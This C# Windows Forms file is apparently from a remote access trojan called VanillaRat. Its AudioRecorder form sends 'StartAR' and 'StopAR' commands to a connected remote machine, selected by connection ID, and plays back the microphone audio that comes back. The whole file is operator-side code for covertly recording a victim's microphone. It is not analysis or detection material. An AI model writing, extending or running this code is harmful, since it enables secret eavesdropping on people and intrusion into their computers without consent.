using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VanillaRat.Forms
{
    public partial class AudioRecorder : Form
    {
        public AudioRecorder()
        {
            InitializeComponent();
            btnPlayback.Enabled = false;
        }
        public int ConnectionID { get; set; }
        public byte[] BytesToPlay { get; set; }
        private bool Recording;
        private bool Playing;

        //Start or stop audio recording
        private void btnStartStopRecord_Click(object sender, EventArgs e)
        {
            if (!Recording)
            {
                Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StartAR"));
                btnStartStopRecord.Text = "Stop Recording";
                Recording = true;
                btnPlayback.Enabled = false;
            }
            else
            {
                Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StopAR"));
                btnStartStopRecord.Text = "Start Recording";
                Recording = false;
                btnPlayback.Enabled = true;
            }

        }
        //Start or stop audio playback
        private void btnPlayback_Click(object sender, EventArgs e)
        {
            SoundPlayer SP = new SoundPlayer();
            if (!Playing)
            {
                try
                {
                    using (MemoryStream MS = new MemoryStream(BytesToPlay))
                    {
                        SP = new SoundPlayer(MS);
                        SP.Play();
                    }
                    btnPlayback.Text = "Stop Playing";
                    Playing = true;
                }
                catch { }
            }
            else
            {
                try
                {
                    SP.Stop();
                } catch { }
            }
        }
    }
}
